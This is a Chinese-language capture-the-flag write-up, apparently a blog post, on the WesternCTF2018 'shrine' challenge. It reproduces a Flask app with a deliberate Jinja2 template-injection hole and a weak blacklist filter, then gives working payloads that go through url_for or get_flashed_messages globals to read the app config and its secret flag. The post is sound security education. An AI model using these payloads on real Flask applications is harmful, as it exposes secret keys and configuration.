# 原创
：  [WesternCTF2018]shrine

# [WesternCTF2018]shrine

#### [WesternCTF2018]shrine

## 考点

> 
SSTI模板注入


## 思路

> 
①：审计题目给的源码，在shrine路径下测试ssti能正常执行；<br/> ②：接着分析源码，注册了一个名为FLAG的config，猜测这就是flag，如果没有过滤可以直接{{config}}即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号；<br/> ③：`return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s`把黑名单的东西遍历并设为空，例如：`/shrine/{{config}}`；<br/> ④：利用python的其它内置函数，比如url_for和get_flashed_messages：`/shrine/{{url_for.__globals__}}`；


## Payload

> 
题目给的源码


```
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/&lt;path:shrine&gt;')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) 
        + s

    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)


```

> 
SSTI测试


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517190445574.png#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517190455143.png#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517190502641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
看到current_app意思应该是当前app，那我们就当前app下的config：`{{url_for.__globals__['current_app'].config}}`，得到flag


> 
我们利用：`{{get_flashed_messages.__globals__['current_app'].config}}`，一样可以

